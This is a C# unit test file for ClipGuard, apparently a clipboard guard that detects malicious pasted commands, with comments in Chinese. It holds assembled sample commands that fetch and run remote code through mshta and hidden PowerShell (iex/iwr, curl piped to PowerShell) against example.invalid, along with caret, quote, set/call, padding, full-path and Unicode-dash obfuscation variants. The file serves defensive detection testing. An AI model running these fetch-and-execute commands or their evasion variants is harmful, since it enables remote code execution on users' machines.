using System.Diagnostics;
using ClipGuard.Core;

namespace ClipGuard.Core.Tests;

// #19：長度填充、完整路徑、cmd 混淆、dash 變體。
// 樣本在執行時用片段組合（docs/detection-rules.md §8），網址一律用 example.invalid。
public class CommandBypassTests
{
    private static readonly string Hta = string.Concat("ms", "hta");
    private static readonly string Ps = string.Concat("power", "shell");
    private const string Url = "https://example.invalid/v.hta";
    private const string PsBody = " -c \"iex(iwr 'https://example.invalid/a')\"";

    // 會被攔截的基本樣本：mshta 直接執行遠端網址。
    private static string HtaSample(string program) => $"{program} {Url}";

    // 會被攔截的基本樣本：隱藏視窗的 PowerShell。
    private static string PsSample(string program, string dash = "-") => $"{program} {dash}w hidden{PsBody}";

    private static void AssertMalicious(string text) =>
        Assert.Equal(ThreatLevel.Malicious, CommandDetector.Analyze(text).Level);

    private static void AssertClean(string text) =>
        Assert.Equal(ThreatLevel.None, CommandDetector.Analyze(text).Level);

    [Fact]
    public void 基本樣本本身會被攔截()
    {
        AssertMalicious(HtaSample(Hta));
        AssertMalicious(PsSample(Ps));
    }

    // ---- F1：長度 ----

    [Theory]
    [InlineData(4097)]
    [InlineData(20_000)]
    [InlineData(1_000_000)]
    public void 惡意指令後面補空白仍攔截(int total)
    {
        var sample = HtaSample(Hta);
        AssertMalicious(sample + new string(' ', total - sample.Length));
    }

    [Fact]
    public void 惡意指令後面換行再補註解仍攔截()
    {
        AssertMalicious(PsSample(Ps) + "\n# " + new string('a', 5000));
        AssertMalicious(PsSample(Ps) + "\r\n" + string.Concat(Enumerable.Repeat("# filler line\r\n", 500)));
    }

    [Fact]
    public void 惡意指令前面補空行或放在長文字中間仍攔截()
    {
        AssertMalicious(new string('\n', 5000) + HtaSample(Hta));
        var filler = string.Concat(Enumerable.Repeat("這是一段很普通的說明文字。\n", 300));
        AssertMalicious(filler + PsSample(Ps) + "\n" + filler);
    }

    [Fact]
    public void 超長的一般文字仍是乾淨()
    {
        var prose = string.Concat(Enumerable.Repeat($"我在學 {Ps}，它放在 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ 底下。\n", 500));
        AssertClean(prose);
        AssertClean(new string(' ', 100_000));
    }

    [Fact]
    public void 超大剪貼簿不會卡住()
    {
        var huge = new[]
        {
            new string(' ', 2_000_000),
            new string('\n', 2_000_000),
            string.Concat(Enumerable.Repeat("certutil " , 200_000)),
            string.Concat(Enumerable.Repeat(new string(' ', 4000) + "x\n", 500)),
        };
        foreach (var text in huge)
        {
            var sw = Stopwatch.StartNew();
            CommandDetector.Analyze(text);
            Assert.True(sw.ElapsedMilliseconds < 3000, $"took {sw.ElapsedMilliseconds} ms");
        }
    }

    // ---- F2：完整路徑與環境變數 ----

    [Theory]
    [InlineData(@"C:\Windows\System32\{0}.exe")]
    [InlineData(@"C:\Windows\SysWOW64\{0}.exe")]
    [InlineData(@"""C:\Windows\System32\{0}.exe""")]
    [InlineData(@"%SystemRoot%\System32\{0}.exe")]
    [InlineData(@"%windir%\System32\{0}")]
    [InlineData(@"""%windir%\SysWOW64\{0}.exe""")]
    public void 完整路徑的mshta會被攔截(string format)
    {
        AssertMalicious(HtaSample(string.Format(format, Hta)));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\WindowsPowerShell\v1.0\{0}.exe")]
    [InlineData(@"""C:\Windows\SysWOW64\WindowsPowerShell\v1.0\{0}.exe""")]
    [InlineData(@"%SystemRoot%\System32\WindowsPowerShell\v1.0\{0}.exe")]
    [InlineData(@"& ""$env:windir\System32\WindowsPowerShell\v1.0\{0}.exe""")]
    public void 完整路徑的PowerShell會被攔截(string format)
    {
        AssertMalicious(PsSample(string.Format(format, Ps)));
    }

    [Fact]
    public void 單獨一行的完整路徑跟只寫程式名稱同等級()
    {
        var bare = CommandDetector.Analyze(Hta + ".exe").Level;
        Assert.Equal(ThreatLevel.Suspicious, bare);
        Assert.Equal(bare, CommandDetector.Analyze($@"C:\Windows\System32\{Hta}.exe").Level);
    }

    [Fact]
    public void ComSpec會被當成cmd()
    {
        var v = CommandDetector.Analyze("%ComSpec% /c curl -s https://example.invalid/x | " + Ps + new string(' ', 40) + "# verify");
        Assert.Equal(ThreatLevel.Malicious, v.Level);
        Assert.Contains("呼叫 cmd 執行指令", v.Reasons);
    }

    // ---- F6：cmd 混淆 ----

    [Theory]
    [InlineData("m^s^h^t^a")]
    [InlineData("\"m\"sh\"ta\"")]
    [InlineData("ms\"\"hta")]
    [InlineData("\"mshta\"")]
    public void 拆開的mshta會被攔截(string program)
    {
        // InlineData 裡的程式名稱都是拆開的；組回來的完整樣本只存在於執行時。
        AssertMalicious(HtaSample(program));
    }

    [Fact]
    public void 插入號拆開的PowerShell與參數會被攔截()
    {
        AssertMalicious($"p^ower^shell -w h^idden{PsBody}");
    }

    [Theory]
    [InlineData("set x={0}&& call %x% {1}")]
    [InlineData("set x={0} && call %x% {1}")]
    [InlineData("set \"x={0}\" & call %x% {1}")]
    [InlineData("set a=ms&set b=hta&call %a%%b% {1}")]
    public void set再call的寫法會被攔截(string format)
    {
        AssertMalicious(string.Format(format, Hta, Url));
    }

    // ---- F8：dash 變體 ----

    [Theory]
    [InlineData('\u2010')]
    [InlineData('\u2013')]
    [InlineData('\u2014')]
    [InlineData('\u2015')]
    [InlineData('\u2212')]
    [InlineData('\uFF0D')]
    public void dash變體的參數會被攔截(char dash)
    {
        AssertMalicious(PsSample(Ps, dash.ToString()));
        AssertMalicious($"{Ps} {dash}enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA=");
    }

    // ---- 不該誤報 ----

    [Theory]
    [InlineData(@"mshta.exe 放在 C:\Windows\System32\mshta.exe，是很舊的工具")]
    [InlineData(@"The file lives in C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe on most systems")]
    [InlineData(@"把 %SystemRoot%\System32\ 加進 PATH")]
    [InlineData(@"C:\Windows\System32\")]
    [InlineData(@"C:\Windows\System32\drivers\etc\hosts")]
    [InlineData("github.com/powershell/powershell")]
    [InlineData("https://example.invalid/tools/mshta.exe")]
    [InlineData("I like powershell \u2013 it's great")]
    [InlineData("I use powershell \u2014 and cmd \u2014 every day")]
    [InlineData("2^10 = 1024")]
    [InlineData(@"set PATH=%PATH%;C:\tools")]
    [InlineData("winget install Microsoft.PowerShell")]
    [InlineData("他說 \"mshta\" 已經被淘汰了")]
    public void 提到程式或路徑的一般文字仍是乾淨(string text)
    {
        AssertClean(text);
    }

    [Theory]
    [InlineData("powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"")]
    [InlineData("powershell \u2013c \"irm bun.sh/install.ps1 | iex\"")]
    [InlineData("curl -fsSL https://bun.sh/install | bash")]
    public void 官方安裝指令維持提醒(string text)
    {
        Assert.Equal(ThreatLevel.Suspicious, CommandDetector.Analyze(text).Level);
    }

    [Fact]
    public void 官方安裝指令加長仍維持提醒()
    {
        var text = "powershell -c \"irm https://get.scoop.sh | iex\"\n" + new string('\n', 5000);
        Assert.Equal(ThreatLevel.Suspicious, CommandDetector.Analyze(text).Level);
    }

    // 原文要保留給還原；正規化只用在比對。
    [Fact]
    public void 隔離區保存原文而不是正規化後的文字()
    {
        var original = HtaSample("m^s^h^t^a");
        var state = new ClipboardGuardState();
        Assert.Equal(ClipboardAction.Quarantine, state.OnClipboardText(original));
        Assert.Equal(original, state.BeginRestore());
    }

    [Fact]
    public void 說明也認得完整路徑與dash變體()
    {
        var e = CommandExplainer.Explain(HtaSample($@"""C:\Windows\System32\{Hta}.exe"""));
        Assert.Contains("用 mshta 執行 example.invalid 上的程式", e.Actions);

        var p = CommandExplainer.Explain(PsSample(Ps, "\u2013"));
        Assert.Contains("隱藏視窗，執行過程你看不到", p.Actions);
    }
}
